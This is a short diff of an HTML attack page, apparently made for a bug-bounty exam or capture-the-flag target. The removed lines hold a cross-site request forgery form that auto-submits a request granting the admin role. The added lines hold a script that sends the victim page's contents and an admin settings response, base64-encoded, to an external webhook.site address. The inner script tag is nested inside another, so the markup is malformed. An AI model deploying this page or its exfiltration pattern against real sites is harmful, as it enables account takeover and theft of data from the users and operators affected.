@@ -1,18 +1,24 @@
 <html>
   <body>
     <h1>Processing...</h1>
-    <form id="pwn" action="https://api-bugbounty-exam.hashacademy.co/api/auth/profile" method="POST">
-      <input type="hidden" name="role" value="admin" />
-      <input type="hidden" name="fullName" value="Pwned_By_Saja" />
-      <input type="hidden" name="email" value="rundlady@gongjua.com" />
-    </form>
 
     <script>
-      // This ensures the bot triggers the webhook so you know it worked
-      fetch('https://webhook.site/107adc74-8f86-4c01-95dd-647268c9c6a8?status=triggered');
+      <script>
+  (async () => {
+    const hook = 'https://webhook.site/45e22f22-d768-4cb1-99e1-737dd37efb79';
+    try {
+      // 1. Leak current page content (often contains flags in the UI)
+      fetch(hook, {method:'POST', body: btoa('PAGE_HTML: ' + document.body.innerHTML.substring(0,1000))});
       
-      // Submit the form automatically
-      document.getElementById('pwn').submit();
+      // 2. Try a different common admin path
+      const res = await fetch('/api/admin/settings');
+      const data = await res.text();
+      fetch(hook, {method:'POST', body: btoa('ADMIN_SETTINGS: ' + data)});
+    } catch(e) {
+      fetch(hook, {method:'POST', body: btoa('ERROR: ' + e.message)});
+    }
+  })();
+</script>
     </script>
   </body>
 </html>
